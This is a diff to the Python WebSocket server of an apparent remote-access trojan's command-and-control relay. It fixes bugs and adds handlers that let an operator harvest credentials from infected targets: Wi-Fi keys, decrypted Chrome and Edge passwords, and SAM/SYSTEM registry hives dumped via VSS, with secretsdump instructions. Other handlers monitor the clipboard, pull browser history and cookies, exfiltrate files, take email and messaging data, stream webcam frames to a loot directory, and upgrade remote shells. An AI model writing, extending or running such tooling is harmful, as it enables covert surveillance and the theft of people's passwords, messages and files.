@@ -537,7 +537,7 @@ async def handler(websocket):
                                 pending_file_responses.pop(request_id, None)
                         
                         elif message.startswith("SEARCH_FILES:"):
-                            # File search
+                            # Filename search
                             request_id = f"search_{id(message)}"
                             response_event = asyncio.Event()
                             pending_file_responses[request_id] = {
@@ -567,7 +567,6 @@ async def handler(websocket):
                                         if int(count) == 0:
                                             await ws_from.send(f"[!] No results found")
                                         else:
-                                            # Display all results (not limited to 20)
                                             num_results = len(results)
                                             output = f"[✓] Found {count} results:\n"
                                             
@@ -580,7 +579,67 @@ async def handler(websocket):
                                                         size_kb = result.get('size', 0) / 1024
                                                         output += f"  {i}. {result['path']} ({size_kb:.2f} KB)\n"
                                             
-                                            # If there are more results than displayed (due to limit on target side)
+                                            if int(count) > num_results:
+                                                output += f"  ... and {int(count) - num_results} more results (increase --limit to see more)"
+                                            
+                                            await ws_from.send(output)
+                                    else:
+                                        await ws_from.send(f"[✗] Invalid search results format")
+                                
+                                elif response.startswith("SEARCH_ERROR:"):
+                                    error_msg = response.split(":", 1)[1]
+                                    print(f"[SEARCH] Error from {target_id}: {error_msg}")
+                                    await ws_from.send(f"[✗] {error_msg}")
+                            
+                            except asyncio.TimeoutError:
+                                await ws_from.send(f"[✗] Search timeout")
+                            finally:
+                                pending_file_responses.pop(request_id, None)
+                        
+                        # FIX: Added SEARCH_CONTENT handler (was missing — caused "Invalid search format")
+                        elif message.startswith("SEARCH_CONTENT:"):
+                            # Content search
+                            request_id = f"search_content_{id(message)}"
+                            response_event = asyncio.Event()
+                            pending_file_responses[request_id] = {
+                                'event': response_event,
+                                'response': None
+                            }
+                            
+                            # Forward to target as-is
+                            await ws_to.send(message)
+                            search_params = message.split(":", 1)[1]
+                            print(f"[SEARCH] Content search on {target_id}: {search_params}")
+                            
+                            try:
+                                await asyncio.wait_for(response_event.wait(), timeout=120.0)
+                                response = pending_file_responses[request_id]['response']
+                                
+                                if response.startswith("SEARCH_RESULTS:"):
+                                    parts = response.split(":", 2)
+                                    if len(parts) == 3:
+                                        _, count, results_json = parts
+                                        
+                                        import json
+                                        results = json.loads(results_json)
+                                        
+                                        print(f"[SEARCH] Found {count} content results on {target_id}")
+                                        
+                                        if int(count) == 0:
+                                            await ws_from.send(f"[!] No results found")
+                                        else:
+                                            num_results = len(results)
+                                            output = f"[✓] Found {count} results:\n"
+                                            
+                                            for i, result in enumerate(results, 1):
+                                                if 'path' in result:
+                                                    if 'line' in result:
+                                                        output += f"  {i}. {result['path']}:{result['line']}\n"
+                                                        output += f"     {result.get('content', '')}\n"
+                                                    else:
+                                                        size_kb = result.get('size', 0) / 1024
+                                                        output += f"  {i}. {result['path']} ({size_kb:.2f} KB)\n"
+                                            
                                             if int(count) > num_results:
                                                 output += f"  ... and {int(count) - num_results} more results (increase --limit to see more)"
                                             
@@ -800,13 +859,12 @@ async def handler(websocket):
                                 pending_file_responses.pop(request_id, None)
                         
                         elif message.startswith("CLIPBOARD_MONITOR:"):
-                            # Start clipboard monitoring
+                            # Forward to target; the single confirmation comes back via
+                            # CLIPBOARD_MONITOR_START (relay_target_to_operator).
+                            # FIX: removed immediate ws_from.send() — it produced a second
+                            # message in command_queue that poisoned the next command's response
                             await ws_to.send(message)
-                            await ws_from.send("[+] Monitoring clipboard...")
-                            print(f"[CLIPBOARD_MONITOR] Started on {target_id}")
-                            
-                            # Monitoring will send updates asynchronously
-                            # No need to wait for completion
+                            print(f"[CLIPBOARD_MONITOR] Forwarded to {target_id}")
                         
                         # Handler CREDS
                         elif message.startswith("CREDS:"):
@@ -821,13 +879,12 @@ async def handler(websocket):
                             try:
                                 await asyncio.wait_for(
                                     pending_file_responses[request_id]['event'].wait(),
-                                    timeout=60.0  # 60s timeout for credential harvesting
+                                    timeout=60.0
                                 )
                                 
                                 response = pending_file_responses[request_id]['response']
                                 
                                 if response.startswith("CREDS_DATA:"):
-                                    # Format: CREDS_DATA:type:json_data
                                     parts = response.split(":", 2)
                                     if len(parts) == 3:
                                         _, cred_type, json_data = parts
@@ -837,7 +894,6 @@ async def handler(websocket):
                                         
                                         print(f"[CREDS] Harvested {cred_type} from {target_id}")
                                         
-                                        # Format output based on type
                                         output = f"[✓] Credential Harvesting - {cred_type.upper()}\n\n"
                                         
                                         if cred_type == "wifi":
@@ -890,7 +946,6 @@ async def handler(websocket):
                                         elif cred_type in ["edge_decrypt", "chrome_decrypt"]:
                                             browser_name = data.get('browser', cred_type.replace('_decrypt', '')).upper()
                                             
-                                            # Check for errors
                                             if 'error' in data:
                                                 output += f"Error: {data['error']}\n"
                                                 if 'note' in data:
@@ -898,17 +953,14 @@ async def handler(websocket):
                                                 if 'path' in data:
                                                     output += f"Path checked: {data['path']}\n"
                                             else:
-                                                # Show summary
                                                 output += f"Browser: {browser_name}\n"
                                                 output += f"Total Passwords: {data.get('total', 0)}\n"
                                                 output += f"  - Decrypted (v10/v11): {data.get('v10_v11_count', 0)}\n"
                                                 output += f"  - App-Bound (v20): {data.get('v20_count', 0)}\n\n"
                                                 
-                                                # Show v20 warning if detected
                                                 if data.get('v20_detected'):
                                                     output += "⚠️  " + data.get('v20_note', '') + "\n\n"
                                                 
-                                                # Show passwords
                                                 if data.get('passwords'):
                                                     output += "="*60 + "\n"
                                                     output += "PASSWORDS\n"
@@ -918,14 +970,10 @@ async def handler(websocket):
                                                         output += f"[{i}] {pwd['url']}\n"
                                                         output += f"    Username: {pwd['username']}\n"
                                                         output += f"    Password: {pwd['password']}\n"
-                                                        
-                                                        # Show version for debugging
                                                         if pwd.get('version'):
                                                             output += f"    Version: {pwd['version']}\n"
-                                                        
                                                         output += "\n"
                                                 
-                                                # Show v20 export help if needed
                                                 if data.get('v20_export_help'):
                                                     output += "="*60 + "\n"
                                                     output += "v20 PASSWORD EXPORT INSTRUCTIONS\n"
@@ -941,26 +989,21 @@ async def handler(websocket):
                                                 output += "╔════════════════════════════════════════════════════╗\n"
                                                 output += "║  REGISTRY HIVES DUMPED VIA VSS                     ║\n"
                                                 output += "╚════════════════════════════════════════════════════╝\n\n"
-                                                
                                                 output += f"Method: {data.get('method', 'VSS')}\n"
                                                 output += f"Hives Dumped: {', '.join(data.get('hives_dumped', []))}\n"
                                                 output += f"Total Hives: {data.get('hive_count', 0)}/3\n\n"
-                                                
                                                 if data.get('errors'):
                                                     output += "Errors:\n"
                                                     for error in data['errors']:
                                                         output += f"  ⚠️  {error}\n"
                                                     output += "\n"
-                                                
                                                 output += f"Filename: {data['filename']}\n"
                                                 output += f"Location: {data['zip_file']}\n"
                                                 output += f"Original Size: {data['original_size_mb']} MB\n"
                                                 output += f"ZIP Size: {data['zip_size_mb']} MB\n"
                                                 output += f"Compression: {data['compression_ratio']}%\n\n"
-                                                
                                                 output += f"💡 Download with:\n"
                                                 output += f"   >>> download {data['filename']}\n\n"
-                                                
                                                 output += "🔓 Extract credentials with:\n"
                                                 output += "   secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL\n\n"
                                                 output += "Or use Impacket:\n"
@@ -980,7 +1023,6 @@ async def handler(websocket):
                         
                         # ======== NEW FEATURE HANDLERS ========
                         
-                        # Handler BROWSER_DEBUG (Diagnostic)
                         elif message == "BROWSER_DEBUG":
                             request_id = str(time.time())
                             pending_file_responses[request_id] = {
@@ -1032,7 +1074,6 @@ async def handler(websocket):
                             finally:
                                 pending_file_responses.pop(request_id, None)
                         
-                        # Handler BROWSER_DATA (Feature 6: Browser History & Cookies)
                         elif message.startswith("BROWSER_DATA:"):
                             request_id = str(time.time())
                             pending_file_responses[request_id] = {
@@ -1060,9 +1101,7 @@ async def handler(websocket):
                                         import json
                                         data = json.loads(json_data)
                                         
-                                        # Check if data was saved to file
                                         if '_saved_file' in data:
-                                            # File save mode - only show file info, skip listing
                                             file_info = data['_saved_file']
                                             output = f"[✓] Browser {data_type.upper()} - Complete Data Saved to File\n\n"
                                             output += f"╔═══════════════════════════════════════════════════════╗\n"
@@ -1074,15 +1113,12 @@ async def handler(websocket):
                                             output += f"Total Entries: {file_info['entries']}\n\n"
                                             output += f"💡 Download this file with:\n"
                                             output += f"   >>> download {file_info['path']}\n"
-                                            
                                             await ws_from.send(output)
                                         else:
-                                            # Normal mode - show listing
                                             output = f"[✓] Browser {data_type.upper()} Extraction\n\n"
                                             
-                                            # Show first 50 entries inline
                                             for browser, info in data.items():
-                                                if browser.startswith('_'):  # Skip metadata fields
+                                                if browser.startswith('_'):
                                                     continue
                                                     
                                                 output += f"═══ {browser.upper()} ═══\n"
@@ -1091,7 +1127,7 @@ async def handler(websocket):
                                                 
                                                 if 'data' in info and info['data']:
                                                     output += "\n"
-                                                    for i, item in enumerate(info['data'][:50], 1):  # Show first 50
+                                                    for i, item in enumerate(info['data'][:50], 1):
                                                         if data_type == 'history':
                                                             output += f"{i}. {item.get('title', 'No title')}\n"
                                                             output += f"   URL: {item.get('url', 'N/A')}\n"
@@ -1115,8 +1151,6 @@ async def handler(websocket):
                                                     if 'debug_path' in info:
                                                         output += f"  Path checked: {info['debug_path']}\n"
                                                         output += f"  Path exists: {info.get('path_exists', False)}\n"
-                                                    
-                                                    # Show specific error messages
                                                     if 'access_error' in info:
                                                         output += f"  ⚠️  {info['access_error']}\n"
                                                     if 'db_error' in info:
@@ -1127,7 +1161,6 @@ async def handler(websocket):
                                                         output += f"  ⚠️  {info['cookie_error']}\n"
                                                     if 'bookmark_error' in info:
                                                         output += f"  ⚠️  {info['bookmark_error']}\n"
-                                                        
                                                 elif 'error' in info:
                                                     output += f"Error: {info['error']}\n"
                                                     if 'traceback' in info:
@@ -1147,7 +1180,6 @@ async def handler(websocket):
                             finally:
                                 pending_file_responses.pop(request_id, None)
                         
-                        # Handler EXFIL (Feature 7: Smart File Exfiltration)
                         elif message.startswith("EXFIL:"):
                             request_id = str(time.time())
                             pending_file_responses[request_id] = {
@@ -1162,7 +1194,7 @@ async def handler(websocket):
                             try:
                                 await asyncio.wait_for(
                                     pending_file_responses[request_id]['event'].wait(),
-                                    timeout=120.0  # Longer timeout for file searches
+                                    timeout=120.0
                                 )
                                 
                                 response = pending_file_responses[request_id]['response']
@@ -1186,7 +1218,6 @@ async def handler(websocket):
                                                     output += f"   Path: {file['path']}\n"
                                                     output += f"   Size: {size_kb:.2f} KB\n"
                                                     output += f"   Matched: {file['pattern_matched']}\n\n"
-                                                
                                                 if 'note' in data:
                                                     output += f"\n{data['note']}\n"
                                         
@@ -1195,7 +1226,7 @@ async def handler(websocket):
                                                 output += f"Pattern Matches Found: {data['pattern_count']} types\n\n"
                                                 for pattern, matches in data['matches'].items():
                                                     output += f"═══ {pattern.upper()} ═══\n"
-                                                    for match in matches[:10]:  # First 10 per pattern
+                                                    for match in matches[:10]:
                                                         output += f"File: {match['file']}\n"
                                                         output += f"Count: {match['count']}\n"
                                                         if 'samples' in match:
@@ -1223,7 +1254,6 @@ async def handler(websocket):
                             finally:
                                 pending_file_responses.pop(request_id, None)
                         
-                        # Handler MSG (Feature 9: Email & Messaging Access)
                         elif message.startswith("MSG:"):
                             request_id = str(time.time())
                             pending_file_responses[request_id] = {
@@ -1259,12 +1289,8 @@ async def handler(websocket):
                                                     output += f"═══ {client.upper()} ═══\n"
                                                     if info.get('found'):
                                                         output += "Status: Found\n"
-                                                        
-                                                        # Show path if available
                                                         if 'path' in info:
                                                             output += f"Path: {info['path']}\n"
-                                                        
-                                                        # Show data files
                                                         if 'data_files' in info:
                                                             if info['data_files']:
                                                                 output += "\nData Files:\n"
@@ -1274,7 +1300,6 @@ async def handler(websocket):
                                                                 output += f"   >>> download \"{info['data_files'][0]}\"\n"
                                                             else:
                                                                 output += "Data Files: None found\n"
-                                                        
                                                         if 'profiles' in info:
                                                             output += f"Profiles: {', '.join(info['profiles'])}\n"
                                                         if 'location' in info:
@@ -1292,7 +1317,6 @@ async def handler(websocket):
                                                     size_kb = folder['size'] / 1024
                                                     output += f"- {folder['folder']} ({size_kb:.2f} KB)\n"
                                                     output += f"  {folder['path']}\n\n"
-                                                
                                                 if 'note' in data:
                                                     output += f"\n{data['note']}\n"
                                             elif 'error' in data:
@@ -1326,18 +1350,14 @@ async def handler(websocket):
                                                 output += "╔════════════════════════════════════════════════════╗\n"
                                                 output += "║  WINDOWS MAIL DATABASE EXPORTED                    ║\n"
                                                 output += "╚════════════════════════════════════════════════════╝\n\n"
-                                                
-                                                # Show method used
                                                 if data.get('method'):
                                                     output += f"Method: {data['method']}\n"
-                                                
                                                 output += f"Filename: {data['filename']}\n"
                                                 output += f"Location: {data['zip_file']}\n"
                                                 output += f"Files Archived: {data['files_archived']}\n"
                                                 output += f"Original Size: {data['original_size_mb']} MB\n"
                                                 output += f"ZIP Size: {data['zip_size_mb']} MB\n"
                                                 output += f"Compression: {data['compression_ratio']}%\n\n"
-                                                
                                                 output += f"💡 Download with:\n"
                                                 output += f"   >>> download {data['filename']}\n\n"
                                                 output += "📖 To read emails:\n"
@@ -1358,7 +1378,6 @@ async def handler(websocket):
                             finally:
                                 pending_file_responses.pop(request_id, None)
                         
-                        # Handler SHELL_UPGRADE (Feature 10: Remote Shell Upgrading)
                         elif message.startswith("SHELL_UPGRADE:"):
                             request_id = str(time.time())
                             pending_file_responses[request_id] = {
@@ -1403,7 +1422,7 @@ async def handler(websocket):
                     print(f"[INFO] {name} relay closed")
                 except asyncio.CancelledError:
                     print(f"[INFO] {name} relay cancelled")
-                    raise  # Important: Re-raise so that the task can be resolved properly
+                    raise
                 except Exception as e:
                     print(f"[RELAY ERROR {name}] {e}")
             
@@ -1418,35 +1437,23 @@ async def handler(websocket):
                                 await ws_to.send(f"[+] Monitoring clipboard... (duration: {duration}s)")
                             
                             elif message.startswith("CLIPBOARD_MONITOR_UPDATE:"):
-                                # Format: CLIPBOARD_MONITOR_UPDATE:timestamp:b64_content
-                                # Timestamp format: YYYY-MM-DD HH:MM:SS (contains colons!)
                                 import base64
                                 try:
-                                    # Remove prefix first
                                     data = message[len("CLIPBOARD_MONITOR_UPDATE:"):]
-                                    
-                                    # Timestamp is first 19 characters: "2026-04-04 02:13:16"
-                                    # Then comes ":" and base64 content
                                     if len(data) > 20:
-                                        timestamp = data[:19]  # "2026-04-04 02:13:16"
-                                        b64_content = data[20:]  # Skip timestamp + ":"
-                                        
-                                        # Try to decode with error handling
+                                        timestamp = data[:19]
+                                        b64_content = data[20:]
                                         try:
                                             decoded_bytes = base64.b64decode(b64_content)
                                             content = decoded_bytes.decode('utf-8')
                                         except UnicodeDecodeError:
-                                            # Try with error replacement
                                             try:
                                                 content = decoded_bytes.decode('utf-8', errors='replace')
                                             except:
-                                                # Last resort: show as latin-1
                                                 content = decoded_bytes.decode('latin-1', errors='ignore')
-                                        
                                         await ws_to.send(f"[{timestamp}] Copied: {content}")
                                 except Exception as e:
                                     print(f"[CLIPBOARD_MONITOR] Decode error: {e}")
-                                    # Continue processing, don't crash
                             
                             elif message.startswith("CLIPBOARD_MONITOR_STOP:"):
                                 msg = message.split(":", 1)[1]
@@ -1457,13 +1464,11 @@ async def handler(websocket):
                                 await ws_to.send(f"[✗] {error}")
                             
                             elif message.startswith("CLIPBOARD_HISTORY_"):
-                                # Just relay history messages directly
                                 await ws_to.send(message)
                             
-                            # Don't wait for pending response, stream directly
                             continue
                         
-                        # Check if this is a response to an FILE_, WEBCAM, AUDIO, SEARCH, SYSINFO, CLIPBOARD, CREDS, BROWSER, EXFIL, MSG or SHELL command
+                        # Check if this is a response to a structured command
                         if message.startswith((
                             "FILE_DATA:", "FILE_ERROR:", "FILE_OK:", 
                             "WEBCAM_DATA:", "WEBCAM_ERROR:", 
@@ -1480,21 +1485,15 @@ async def handler(websocket):
                             "SHELL_UPGRADE:", "SHELL_ERROR:",
                             "LIST_DOWNLOADS_OK:", "LIST_DOWNLOADS_ERROR:"
                         )):
-                            # Find the pending request
                             handled = False
                             for request_id, data in pending_file_responses.items():
-                                if data['response'] is None:  # Première réponse non traitée
+                                if data['response'] is None:
                                     data['response'] = message
                                     data['event'].set()
                                     handled = True
                                     break
-                            
-                            # If there are no pending requests, this may be a residual message
-                            # We ignore (do not pass this on to the operator)
                         
-                        # Handle streaming frames separately (continuous, not request/response)
                         elif message.startswith("STREAM_FRAME:"):
-                            # Format: STREAM_FRAME:frame_number:base64_data
                             try:
                                 parts = message.split(":", 2)
                                 if len(parts) == 3:
@@ -1506,7 +1505,6 @@ async def handler(websocket):
                                     
                                     image_data = base64.b64decode(b64_data)
                                     
-                                    # Save frame to loot directory
                                     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                     safe_filename = f"{target_id}_stream_frame_{frame_num}.jpg"
                                     filepath = Path(LOOT_DIR) / safe_filename
@@ -1516,7 +1514,6 @@ async def handler(websocket):
                                     
                                     size_kb = len(image_data) / 1024
                                     
-                                    # Send notification to operator (every 10 frames to avoid spam)
                                     if int(frame_num) % 10 == 0:
                                         await ws_to.send(f"[STREAM] Frame {frame_num} ({size_kb:.1f} KB) → {filepath}")
                                     
@@ -1525,14 +1522,13 @@ async def handler(websocket):
                                 print(f"[STREAM] Error processing frame: {e}")
                         
                         else:
-                            # Standard message - forward to the operator
                             await ws_to.send(message)
                 
                 except websockets.exceptions.ConnectionClosed:
                     print(f"[INFO] {name} relay closed")
                 except asyncio.CancelledError:
                     print(f"[INFO] {name} relay cancelled")
-                    raise  # Important: Re-raise the issue so that the task can be resolved properly
+                    raise
                 except Exception as e:
                     print(f"[RELAY ERROR {name}] {e}")
             
@@ -1542,12 +1538,10 @@ async def handler(websocket):
                 asyncio.create_task(relay_target_to_operator(target_ws, websocket, f"target({target_id})->op({login})"))
             ]
             
-            # Save tasks so they can be cancelled later
             active_relays[target_id] = relay_tasks
             
             await asyncio.gather(*relay_tasks, return_exceptions=True)
             
-            # Clean after disconnecting
             active_relays.pop(target_id, None)
             
             print(f"[-] Operator {login} disconnected from target {target_id}")
@@ -1577,7 +1571,7 @@ async def start_server(host: str, port: int, certfile: str):
         port,
         ssl=ssl_context,
         ping_interval=None,
-        max_size=10_000_000  # 10MB max for files
+        max_size=100_000_000
     ):
         print(f"[+] Server running on wss://{host}:{port}")
         print(f"[+] Credentials file: {CREDS_FILE}")
